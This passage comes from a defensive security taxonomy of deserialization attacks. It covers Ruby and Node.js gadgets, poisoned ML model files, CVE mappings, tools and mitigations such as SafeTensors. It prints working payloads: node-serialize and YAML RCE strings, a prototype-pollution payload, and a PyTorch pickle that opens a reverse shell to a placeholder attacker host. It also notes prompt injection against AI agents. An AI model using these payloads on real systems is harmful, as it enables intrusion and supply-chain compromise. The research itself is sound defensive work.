| **Active Record Serialized Columns** | Rails Active Record columns configured with `serialize` use YAML by default; if attacker can influence column content, deserialization triggers arbitrary object instantiation (CVE-2022-32224) | Active Record `serialize` with YAML on attacker-influenced data |
| **RubyGems Package Deserialization** | RubyGems historically used `YAML.load()` for gemspec parsing, enabling RCE through malicious gem metadata (CVE-2017-0903) | Older RubyGems versions processing untrusted gems |

### §8-6. JavaScript/Node.js Ecosystem

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **node-serialize RCE** | `node-serialize` library's `unserialize()` function evaluates JavaScript code embedded in serialized data via Immediately Invoked Function Expressions (IIFE) | Application using `node-serialize` with untrusted data |
| **Prototype Pollution via Deserialization** | JSON parsing or custom deserialization that doesn't guard against `__proto__`, `constructor.prototype`, or `constructor` properties enables prototype pollution, potentially escalatable to RCE | Property-expanding deserializer without prototype pollution guards |
| **React Flight Protocol Exploitation** | `reviveModel()` in React Server Components assigns properties without `hasOwnProperty` verification; attacker-crafted payloads pollute `Object.prototype`, enabling `Function` constructor access → `child_process.execSync` (CVE-2025-55182) | React 19.x RSC unpatched |

**Payload — node-serialize IIFE RCE:**
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
```

**Payload — Prototype Pollution → RCE (Node.js):**
```json
{"__proto__":{"constructor":{"prototype":{"env":{"NODE_OPTIONS":"--require /proc/self/environ"}}}}}
```

**Payload — Ruby YAML.load RCE:**
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: "id"
       method_id: :resolve
```

---

## §9. AI/ML Model Serialization Attacks

A rapidly expanding attack surface driven by the widespread use of unsafe serialization formats for ML model persistence and distribution.

### §9-1. Model File Poisoning

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Pickle-Based Model Backdoors** | PyTorch `.pt`/`.pth` files use pickle internally; injecting `__reduce__`-based payloads into model files enables RCE on `torch.load()` | Loading untrusted PyTorch model files |
| **Sleepy Pickle (Stealthy Model Tampering)** | Instead of obvious RCE payloads, the injected pickle code modifies the model *in place* during deserialization — inserting backdoors, altering outputs, or exfiltrating data through the model's normal operation | ML pipeline loading externally sourced models |
| **Keras Config Tampering** | Keras `.keras` files contain `config.json` that can be modified to achieve code execution even with `safe_mode=True` enabled | Loading untrusted Keras models |
| **Joblib/Cloudpickle Model Files** | Scikit-learn models saved with `joblib.dump()` use pickle; similarly, `cloudpickle` (used by MLflow, Spark) enables arbitrary code execution | Loading untrusted sklearn/MLflow models |

**Payload — Malicious PyTorch model (reverse shell in .pt file):**
```python
import torch
class MaliciousModel(torch.nn.Module):
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'",))
torch.save(MaliciousModel(), "model.pt")
# victim: torch.load("model.pt")  →  reverse shell
```

**Payload — Sleepy Pickle (stealthy model tampering):**
```python
class SleepyPickle:
    def __reduce__(self):
        # Instead of obvious RCE, silently modify model weights/behavior
        return (self._tamper_model, (original_model, backdoor_trigger))
# Model appears normal but produces attacker-controlled outputs for specific inputs
```

### §9-2. ML Supply Chain Exploitation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Model Repository Poisoning** | Uploading malicious models to public repositories (Hugging Face Hub, PyTorch Hub) containing reverse shells, credential theft, or system fingerprinting payloads | Users downloading and loading models from public repositories |
| **Scanner Evasion (nullifAI)** | Using 7z compression instead of ZIP to prevent Picklescan detection; the malicious payload executes before the deserialization error from invalid format is raised | Picklescan or similar tool with format-dependent scanning |
| **PickleCloak Automated Bypass** | Automatically discovering gadgets that are not on scanner blocklists and using them to construct payloads that evade detection | Blocklist-based model security scanners |
| **Framework-Level Vulnerabilities** | Exploiting deserialization flaws in ML serving frameworks: vLLM (ZeroMQ pickle payloads in versions 0.6.5–0.8.4), Hugging Face Transformers (CVE-2024-11394), LangChain (CVE-2025-68664 "LangGrinch") | ML serving infrastructure processing untrusted serialized data |

### §9-3. Safe Serialization Format Alternatives

| Format | Security Model | Limitation |
|---|---|---|
| **SafeTensors** | Stores only tensor data (no executable code); no deserialization callbacks | Cannot serialize arbitrary Python objects or model architectures |
| **ONNX** | Standardized model exchange format with well-defined schema; no arbitrary code execution | Limited to operations defined in ONNX opset; some model types cannot be fully represented |
| **TensorFlow SavedModel (tf.saved_model)** | Graph-based serialization without pickle; uses Protocol Buffers | Still allows custom ops that could be abused; larger attack surface than SafeTensors |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories |
|---|---|---|
| **Direct Endpoint Exploitation** | Application endpoint accepting serialized data (REST API, RMI, SOAP, ViewState) | §1 + §2 + §3 + §4 |
| **Supply-Chain Model Poisoning** | ML pipeline loading models from external repositories | §9 + §6-2 + §7-2 |
| **Nested/Chained Deserialization** | Multi-layer processing pipeline crossing format boundaries | §5-1 + §4 + §2 |
| **Filter/WAF Bypass** | Hardened endpoint with deserialization filters or network-level inspection | §6 + §7 + §1-2 |
| **Framework-Specific Exploitation** | Application using specific framework with known gadgets (Spring, Laravel, Rails, React RSC) | §8 + §1-1 + §3 |
| **Session/State Manipulation** | Application storing session state in serialized format (PHP sessions, ViewState, JWT) | §4-3 + §2-2 + §8 |
| **Prompt Injection → Deserialization** | AI agent steered into generating crafted output that is then serialized/deserialized (LangGrinch pattern) | §9-2 + §5-2 |

---

## CVE / Bounty Mapping (2024–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §4-3 + §8-6 (Flight Protocol + Prototype Pollution → RCE) | CVE-2025-55182 (React Server Components) | CVSS 10.0. Unauthenticated RCE on ~40% of web developer ecosystem. Near-100% exploit reliability |
| §5-1 + §5-2 (Nested Deserialization → XXE → Key Leak) | CVE-2024-34102 (Adobe Commerce/Magento "CosmicSting") | CVSS 9.8. Pre-auth XXE enabling crypto key exfiltration → admin JWT forgery → RCE. Exploited in the wild |
| §9-2 (ML Framework Deserialization) | CVE-2024-11394 (Hugging Face Transformers) | Critical. Pickle-based RCE via insufficient validation in model loading |
| §9-2 + §5-2 (Prompt Injection → Serialization Injection) | CVE-2025-68664 (LangChain "LangGrinch") | CVSS 9.3. Secret exfiltration and potential RCE via prompt injection → serialization marker key escape failure |
| §8-1 (Java Endpoint Deserialization) | CVE-2025-26399 (SolarWinds Web Help Desk) | Unauthenticated AjaxProxy deserialization RCE |
| §7-2 + §9-2 (Scanner Bypass + ML Model Poisoning) | CVE-2025-1716 (Picklescan bypass via pip.main()) | Scanner bypass enabling malicious package installation during deserialization |
| §9-1 (ML Framework Deserialization) | vLLM ZeroMQ Pickle RCE (versions 0.6.5–0.8.4) | Arbitrary code execution via pickle payloads over ZeroMQ in ML serving infrastructure |
| §9-1 (Keras safe_mode bypass) | Keras config.json tampering | RCE even with safe_mode=True via model archive manipulation |
| §4-3 + §8-6 (Next.js Flight Protocol) | CVE-2025-66478 (Next.js, duplicate of CVE-2025-55182) | Rejected as duplicate; same React Flight protocol flaw |
| §8-4 (DataSet type-confusion) | .NET DataSetSurrogateSelector bypass (Top 10 2025 nomination) | Pre-auth RCE via type-confusion → TemplateParser gadget chain |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **ysoserial** (Offensive) | Java gadget chain generation for 46+ known chains | Generates serialized payloads for known gadget chains across Java libraries |
| **ysoserial.net** (Offensive) | .NET gadget chain generation for BinaryFormatter, Json.Net, etc. | Generates serialized payloads for .NET deserialization sinks |
| **PHPGGC** (Offensive) | PHP `unserialize()` and PHAR payload generation | Library of PHP POP chains with CLI and programmatic generation |
| **Burp Collaborator + Java Deserialization Scanner** (Offensive) | Detection of Java deserialization endpoints | Sends probe payloads and monitors for out-of-band callbacks |
| **GadgetProbe** (Offensive) | Java classpath probing via serialized objects | Identifies classes, libraries, and versions on remote classpaths by observing deserialization behavior |
| **FLASH** (Research) | Automated Java gadget chain mining | Deserialization-guided call graph construction with hybrid dispatch resolution (USENIX Security 2025) |
| **Gleipner** (Research) | Benchmarking gadget chain detection algorithms | First synthetic, large-scale benchmark for validating 7 published gadget chain detection approaches (FSE 2025) |
| **ODDFuzz** (Research) | Java deserialization vulnerability fuzzing | Structure-aware directed greybox fuzzing for gadget chain discovery |
| **Picklescan** (Defensive) | Python pickle file scanning for malicious payloads | Blocklist-based detection of dangerous callables in pickle streams |
| **ModelScan** (Defensive) | ML model file security scanning (pickle, Keras, TF) | Multi-format model scanning for embedded malicious code |
| **PickleBall** (Research) | Secure pickle deserialization framework | Allowlist-based approach to safe pickle deserialization for ML models |
| **Brakeman** (Defensive) | Ruby on Rails static analysis | Detects `Marshal.load()`, `YAML.load()`, and `CSV.load()` on untrusted data |
| **Semgrep Rules** (Defensive) | Multi-language static analysis | Pre-built rules for detecting unsafe deserialization patterns across Java, Python, PHP, Ruby, .NET |
| **SerializationDumper** (Research) | Java serialization stream analysis | Parses and displays Java serialization stream contents for analysis |

---

## Summary: Core Principles

### The Root Cause

The fundamental property that makes deserialization vulnerabilities both pervasive and difficult to eliminate is that **serialization formats conflate data with behavior**. When a format encodes type information, reconstruction logic, or callback invocations alongside the data itself, deserialization becomes a code-execution primitive rather than a data-parsing operation. This is not a bug in any specific implementation — it is an inherent property of formats designed for full object graph reconstruction (pickle, Marshal, BinaryFormatter, Java ObjectInputStream). Even formats that appear data-only (JSON, YAML, XML) become dangerous when libraries add polymorphic type resolution or tag-based object instantiation.

### Why Incremental Fixes Fail

Deserialization defense typically follows a reactive pattern: a new gadget chain is discovered, the dangerous class is added to a blocklist, and the cycle repeats. This approach fails for three structural reasons:

1. **Asymmetric discovery**: The attacker needs to find *one* exploitable chain; the defender must block *all* possible chains. With dormant gadgets activatable in 26% of dependencies, the gadget space is effectively unbounded.
2. **Format-level insecurity**: For formats like pickle and Marshal, security is architecturally impossible — `__reduce__` is *designed* to execute arbitrary callables. No amount of filtering can make arbitrary pickle deserialization safe.
3. **Ecosystem expansion**: New attack surfaces (ML model files, React Flight protocol, AI agent serialization) continuously emerge, each introducing deserialization in contexts where security teams may not expect it.

### The Structural Solution

The only robust defense is to **eliminate the conflation of data and behavior**: use data-only formats (JSON without polymorphic typing, Protocol Buffers, SafeTensors) for untrusted input, validate schemas before deserialization, and apply strict allowlists (not blocklists) when type-resolving deserialization is unavoidable. For ML models specifically, the migration from pickle to SafeTensors/ONNX represents the correct structural approach — removing executable code from the serialization format entirely rather than trying to detect malicious code within an inherently executable format.

---

*This document was created for defensive security research and vulnerability understanding purposes.*

---

## References

### Research Papers

**[R1]** Yiheng Zhang, Ming Wen, Shunjie Liu, Dongjie He, and Hai Jin. "Precise and Effective Gadget Chain Mining through Deserialization Guided Call Graph Construction (FLASH)." In *Proceedings of the 34th USENIX Security Symposium (USENIX Security '25)*, 2025. [[Paper]](https://www.usenix.org/system/files/usenixsecurity25-zhang-yiheng.pdf) [[Presentation]](https://www.usenix.org/conference/usenixsecurity25/presentation/zhang-yiheng)

**[R2]** Sicong Cao, Biao He, Xiaobing Sun, Yu Ouyang, Chao Zhang, Xiaoxue Wu, Ting Su, Lili Bo, Bin Li, Chuanlei Ma, Jiajia Li, and Tao Wei. "ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing." In *Proceedings of the 44th IEEE Symposium on Security and Privacy (S&P '23)*, May 2023. [[IEEE]](https://ieeexplore.ieee.org/document/10179377/) [[arXiv]](https://arxiv.org/abs/2304.04233)

**[R3]** Bruno Kreyssig and Alexandre Bartel. "Gleipner: A Benchmark for Gadget Chain Detection in Java Deserialization Vulnerabilities." In *Proceedings of the ACM on Software Engineering (FSE '25)*, 2025. [[ACM]](https://dl.acm.org/doi/10.1145/3715711) [[PDF]](https://www.abartel.net/static/p/fse2025-gleipner.pdf)

**[R4]** Sicong Cao, Xiaobing Sun, Xiaoxue Wu, Lili Bo, Bin Li, Rongxin Wu, Wei Liu, Biao He, Yu Ouyang, and Jiajia Li. "Improving Java Deserialization Gadget Chain Mining via Overriding-Guided Object Generation (GCMiner)." In *Proceedings of the 45th International Conference on Software Engineering (ICSE '23)*, May 2023. [[ACM]](https://dl.acm.org/doi/abs/10.1109/ICSE48619.2023.00044) [[arXiv]](https://arxiv.org/abs/2303.07593) [[GitHub]](https://github.com/GCMiner/GCMiner)

**[R5]** Bruno Kreyssig, Sabine Houy, Timothee Riom, and Alexandre Bartel. "Sleeping Giants -- Activating Dormant Java Deserialization Gadget Chains through Stealthy Code Changes." In *Proceedings of the 2025 ACM SIGSAC Conference on Computer and Communications Security (CCS '25)*, 2025. [[ACM]](https://doi.org/10.1145/3719027.3765031) [[arXiv]](https://arxiv.org/abs/2504.20485)

**[R6]** Boyan Milanov. "Sleepy Pickle: Exploiting ML Models with Pickle File Attacks." Trail of Bits Blog, June 11, 2024. [[Part 1]](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/) [[Part 2]](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-2/)

**[R7]** ReversingLabs Research Team. "Malicious ML Models Discovered on Hugging Face Platform (nullifAI Attack)." ReversingLabs Blog, February 6, 2025. [[Blog]](https://www.reversinglabs.com/blog/rl-identifies-malware-ml-model-hosted-on-hugging-face)

**[R8]** Tong Liu, Guozhu Meng, Peng Zhou, Zizhuang Deng, Shuaiyin Yao, and Kai Chen. "The Art of Hide and Seek: Making Pickle-Based Model Supply Chain Poisoning Stealthy Again (PickleCloak)." arXiv preprint, August 2025. [[arXiv]](https://arxiv.org/abs/2508.19774)

**[R9]** Andreas D. Kellas, Neophytos Christou, Wenxin Jiang, Penghui Li, Laurent Simon, Yaniv David, Vasileios P. Kemerlis, James C. Davis, and Junfeng Yang. "PickleBall: Secure Deserialization of Pickle-based Machine Learning Models." In *Proceedings of the 2025 ACM SIGSAC Conference on Computer and Communications Security (CCS '25)*, October 2025. *Distinguished Artifact Award*. [[ACM]](https://dl.acm.org/doi/10.1145/3719027.3765037) [[arXiv]](https://arxiv.org/abs/2508.15987)

### CVE Advisories

**[CVE-2025-55182]** React Server Components Flight Protocol — Unauthenticated RCE via Prototype Pollution. CVSS 10.0. [[NVD]](https://nvd.nist.gov/vuln/detail/CVE-2025-55182) [[Wiz Research]](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182) [[React Advisory]](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)

**[CVE-2024-34102]** Adobe Commerce/Magento "CosmicSting" — Nested Deserialization → XXE. CVSS 9.8. [[NVD]](https://nvd.nist.gov/vuln/detail/CVE-2024-34102) [[Assetnote]](https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102)

**[CVE-2024-11394]** Hugging Face Transformers Trax Model Deserialization RCE. CVSS 8.8. [[NVD]](https://nvd.nist.gov/vuln/detail/CVE-2024-11394) [[GitHub Advisory]](https://github.com/advisories/GHSA-hxxf-235m-72v3)

**[CVE-2025-68664]** LangChain Core "LangGrinch" — Serialization Injection via Prompt Injection. CVSS 9.3. [[NVD]](https://nvd.nist.gov/vuln/detail/CVE-2025-68664) [[Cyata Research]](https://cyata.ai/blog/langgrinch-langchain-core-cve-2025-68664/)

**[CVE-2025-26399]** SolarWinds Web Help Desk — Unauthenticated AjaxProxy Deserialization RCE. CVSS 9.8. [[NVD]](https://nvd.nist.gov/vuln/detail/CVE-2025-26399) [[Huntress]](https://www.huntress.com/blog/active-exploitation-solarwinds-web-help-desk-cve-2025-26399)

**[CVE-2025-1716]** Picklescan Bypass via `pip.main()` Callable Substitution. [[NVD]](https://nvd.nist.gov/vuln/detail/CVE-2025-1716) [[GitHub Advisory]](https://github.com/advisories/GHSA-655q-fx9r-782v)

**[CVE-2025-32444]** vLLM ZeroMQ Pickle RCE via Mooncake Integration. Affects vLLM 0.6.5–0.8.4. [[GitHub Advisory]](https://github.com/vllm-project/vllm/security/advisories/GHSA-hj4w-hm2g-p6w5)

**[CVE-2022-40609]** IBM SDK Java Technology Edition — JEP 290 Bypass via ORB Deserialization. CVSS 8.1. [[IBM Bulletin]](https://www.ibm.com/support/pages/security-bulletin-cve-2022-40609-affects-ibm-sdk-java-technology-edition)

**[CVE-2022-32224]** Rails Active Record Serialized Columns — RCE via YAML Deserialization. CVSS 9.8. [[Rails Advisory]](https://discuss.rubyonrails.org/t/cve-2022-32224-possible-rce-escalation-bug-with-serialized-columns-in-active-record/81017) [[GitHub Advisory]](https://github.com/advisories/GHSA-3hhc-qp5v-9p2j)

**[CVE-2017-0903]** RubyGems Unsafe Object Deserialization via YAML. [[RubyGems Blog]](https://blog.rubygems.org/2017/10/09/unsafe-object-deserialization-vulnerability.html)

### Tools

**[T1]** Chris Frohoff. "ysoserial: Proof-of-Concept Tool for Generating Java Deserialization Payloads." [[GitHub]](https://github.com/frohoff/ysoserial)

**[T2]** Alvaro Munoz and Soroush Dalili. "ysoserial.net: Deserialization Payload Generator for .NET Formatters." [[GitHub]](https://github.com/pwntester/ysoserial.net)

**[T3]** Ambionics Security. "PHPGGC: PHP Generic Gadget Chains." [[GitHub]](https://github.com/ambionics/phpggc)

**[T4]** Bishop Fox. "GadgetProbe: Exploiting Deserialization to Brute-Force the Remote Classpath." [[GitHub]](https://github.com/BishopFox/GadgetProbe) [[Blog]](https://bishopfox.com/blog/gadgetprobe)

**[T5]** Matthieu Maitre. "Picklescan: Security Scanner for Python Pickle Files." [[GitHub]](https://github.com/mmaitre314/picklescan)

**[T6]** Protect AI. "ModelScan: Protection Against Model Serialization Attacks." [[GitHub]](https://github.com/protectai/modelscan)

**[T7]** Nick Sherlock. "SerializationDumper: Java Serialization Stream Analysis Tool." [[GitHub]](https://github.com/NickstaDB/SerializationDumper)

### Standards and Specifications

**[S1]** Oracle. "JEP 290: Filter Incoming Serialization Data." Java 9+. [[OpenJDK]](https://openjdk.org/jeps/290)

**[S2]** Oracle. "JEP 415: Context-Specific Deserialization Filters." Java 17+. [[OpenJDK]](https://openjdk.org/jeps/415)

**[S3]** Microsoft .NET Team. "BinaryFormatter Removed from .NET 9." September 2024. [[Blog]](https://devblogs.microsoft.com/dotnet/binaryformatter-removed-from-dotnet-9/) [[Security Guide]](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide) [[Migration Guide]](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-migration-guide/)

**[S4]** Hugging Face. "SafeTensors: Simple, Safe Way to Store and Distribute Tensors." [[GitHub]](https://github.com/huggingface/safetensors) [[Documentation]](https://huggingface.co/docs/text-generation-inference/en/conceptual/safetensors)

**[S5]** React Team. "React Server Components and Flight Protocol." [[Documentation]](https://react.dev/reference/rsc/server-components)

### Additional Industry Research

**[A1]** Sonatype Research. "Exposing 4 Critical Vulnerabilities in Python Picklescan." [[Blog]](https://www.sonatype.com/blog/bypassing-picklescan-sonatype-discovers-four-vulnerabilities)

**[A2]** JFrog Security Research. "PyTorch Users at Risk: Unveiling 3 Zero-Day PickleScan Vulnerabilities." [[Blog]](https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/)

**[A3]** Cisco Talos. "Breaking the Jar: Hardening Pickle File Scanners with Structure-Aware Fuzzing." [[Blog]](https://blogs.cisco.com/ai/hardening-pickle-file-scanners)

**[A4]** Hugging Face. "Pickle Scanning." [[Documentation]](https://huggingface.co/docs/hub/security-pickle)

